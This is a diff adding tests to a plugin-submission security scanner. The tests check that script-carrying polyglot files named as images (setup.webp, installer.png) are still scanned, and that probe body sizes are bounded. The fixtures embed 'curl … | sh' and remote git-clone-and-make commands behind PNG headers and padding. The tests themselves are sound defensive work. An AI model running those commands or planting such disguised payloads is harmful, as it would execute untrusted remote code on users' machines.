@@ -31,6 +31,7 @@ import {
   serializeSecurityBaselineMarker,
 } from "../scripts/security-baseline.mjs";
 import { probeSnapshotFile } from "../scripts/security-github-snapshot.mjs";
+import { securityBinaryProbeByteLimit } from "../scripts/security-baseline-limits.mjs";
 import { writeValidationMetadata } from "../scripts/validate-submission.mjs";
 
 const commit = "a".repeat(40);
@@ -1147,6 +1148,60 @@ test("binary setup-named assets are excluded from the text scan", async () => {
   ]);
 });
 
+test("ambiguous setup assets remain in the scan", async () => {
+  const manifest = JSON.stringify({ entryPoints: { barWidget: "BarWidget.qml" } });
+  const invalidUtf8Shell = Buffer.concat([
+    Buffer.from("#"),
+    Buffer.from([0xff]),
+    Buffer.from("\ncurl -fsSL https://example.test/payload | sh"),
+  ]);
+  const pngScriptPolyglot = Buffer.concat([
+    Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0xff]),
+    Buffer.from("\n# curl payload\ncurl -fsSL https://example.test/payload | sh"),
+  ]);
+  const paddedPngScriptPolyglot = Buffer.concat([
+    Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
+    Buffer.alloc(4096, 0x80),
+    Buffer.from("\ncurl -fsSL https://example.test/payload | sh"),
+  ]);
+  const paddedPngGitPolyglot = Buffer.concat([
+    Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
+    Buffer.alloc(4096, 0x80),
+    Buffer.from("\ngit clone https://github.com/example/payload source && cd source && make"),
+  ]);
+  const snapshot = await resolveSubmissionSnapshot(
+    "https://github.com/example/plugin",
+    commit,
+    {
+      fetchImpl: githubFixtureFetch({
+        tree: [
+          { path: "manifest.json", type: "blob", mode: "100644", size: Buffer.byteLength(manifest) },
+          { path: "BarWidget.qml", type: "blob", mode: "100644", size: 7 },
+          { path: "setup.webp", type: "blob", mode: "100644", size: invalidUtf8Shell.length },
+          { path: "installer.png", type: "blob", mode: "100644", size: pngScriptPolyglot.length },
+          { path: "padded-installer.png", type: "blob", mode: "100644", size: paddedPngScriptPolyglot.length },
+          { path: "padded-git-installer.png", type: "blob", mode: "100644", size: paddedPngGitPolyglot.length },
+        ],
+        contents: {
+          "manifest.json": manifest,
+          "BarWidget.qml": "Item {}",
+          "setup.webp": invalidUtf8Shell,
+          "installer.png": pngScriptPolyglot,
+          "padded-installer.png": paddedPngScriptPolyglot,
+          "padded-git-installer.png": paddedPngGitPolyglot,
+        },
+      }),
+    },
+  );
+  assert.ok(snapshot.files.some((entry) => entry.path === "setup.webp"));
+  assert.ok(snapshot.files.some((entry) => entry.path === "installer.png"));
+  assert.ok(snapshot.files.some((entry) => entry.path === "padded-installer.png"));
+  assert.ok(snapshot.files.some((entry) => entry.path === "padded-git-installer.png"));
+  const findings = buildSecurityBaseline(snapshot, { checkedAt }).findings.map((finding) => finding.ruleId);
+  assert.ok(findings.includes("curl-pipe-shell"));
+  assert.ok(findings.includes("remote-git-execution-unpinned"));
+});
+
 test("binary asset probe bodies are bounded", async () => {
   const body = Buffer.alloc(4097);
   await assert.rejects(
@@ -1160,6 +1215,26 @@ test("binary asset probe bodies are bounded", async () => {
           headers: {
             "content-length": String(body.length),
             "content-range": `bytes 0-4095/${body.length}`,
+          },
+        }),
+      },
+    ),
+    (error) => error?.code === "security-baseline-scan-limit",
+  );
+});
+
+test("binary asset probes reject oversized bodies without a length header", async () => {
+  const body = Buffer.alloc(securityBinaryProbeByteLimit + 1);
+  await assert.rejects(
+    probeSnapshotFile(
+      { owner: "example", repository: "plugin" },
+      commit,
+      { path: "setup.webp", mode: "100644", size: securityBinaryProbeByteLimit },
+      {
+        fetchImpl: async () => new Response(body, {
+          status: 206,
+          headers: {
+            "content-range": `bytes 0-${securityBinaryProbeByteLimit - 1}/${securityBinaryProbeByteLimit}`,
           },
         }),
       },
